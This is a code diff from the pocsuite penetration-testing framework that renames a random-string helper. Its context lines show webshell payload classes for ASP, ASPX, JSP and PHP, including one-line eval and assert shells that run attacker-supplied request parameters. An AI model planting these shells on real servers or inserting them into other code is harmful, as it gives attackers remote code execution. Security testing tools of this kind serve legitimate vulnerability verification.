@@ -7,7 +7,7 @@ See the file 'docs/COPYING' for copying permission
 """
 
 from pocsuite.lib.request.basic import req
-from pocsuite.api.utils import random_str
+from pocsuite.api.utils import randomStr
 
 
 class Webshell:
@@ -54,7 +54,7 @@ class VerifyShell(Webshell):
 
 
 class AspShell(Webshell):
-    _keyword = random_str(20)
+    _keyword = randomStr(20)
     _password = 'cmd'
     _content = '<%eval request("{0}")%>'
     _check_statement = 'Response.Write(Replace("202cTEST4b70","TEST",' \
@@ -63,7 +63,7 @@ class AspShell(Webshell):
 
 
 class AspVerify(VerifyShell):
-    _keyword = random_str(20)
+    _keyword = randomStr(20)
     _content = '<%\n' \
         'Response.Write(Replace("202cTEST4b70","TEST",' \
         '"' + _keyword + '"))\n' \
@@ -74,7 +74,7 @@ class AspVerify(VerifyShell):
 
 
 class AspxShell(Webshell):
-    _keyword = random_str(20)
+    _keyword = randomStr(20)
     _password = 'cmd'
     _content = '<%@ Page Language="Jscript"%>' \
                '<%eval(Request.Item["{0}"],"unsafe");%>'
@@ -84,7 +84,7 @@ class AspxShell(Webshell):
 
 
 class AspxVerify(VerifyShell):
-    _keyword = random_str(20)
+    _keyword = randomStr(20)
     _content = '<%@ Page Language="Jscript" ContentType="text/html" ' \
         'validateRequest="false" aspcompat="true"%>\n' \
         '<%Response.Write("202cTEST4b70".Replace("TEST",' \
@@ -94,7 +94,7 @@ class AspxVerify(VerifyShell):
 
 
 class JspShell(Webshell):
-    _keyword = random_str(20)
+    _keyword = randomStr(20)
     _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
         '<%@ page import="java.io.*"%>\n' \
         '<%@ page import="java.util.*"%>\n' \
@@ -121,7 +121,7 @@ class JspShell(Webshell):
 
 
 class JspVerify(VerifyShell):
-    _keyword = random_str(20)
+    _keyword = randomStr(20)
     _content = '<%@ page import="java.util.*,java.io.*" %>\n' \
         '<%@ page import="java.io.*"%>\n' \
         '<%@ page import="java.util.*"%>\n' \
@@ -138,12 +138,12 @@ class JspVerify(VerifyShell):
 
 
 class PhpShell(Webshell):
-    _keyword = random_str(20)
+    _keyword = randomStr(20)
     _password = 'cmd'
     _content = "<?php @assert($_REQUEST['{0}']);?>"
     _check_statement = 'var_dump(md5(' + _keyword + '));'
 
 
 class PhpVerify(VerifyShell):
-    _keyword = random_str(20)
+    _keyword = randomStr(20)
     _content = "<?php var_dump(md5(" + _keyword + "));unlink(__FILE__);?>"
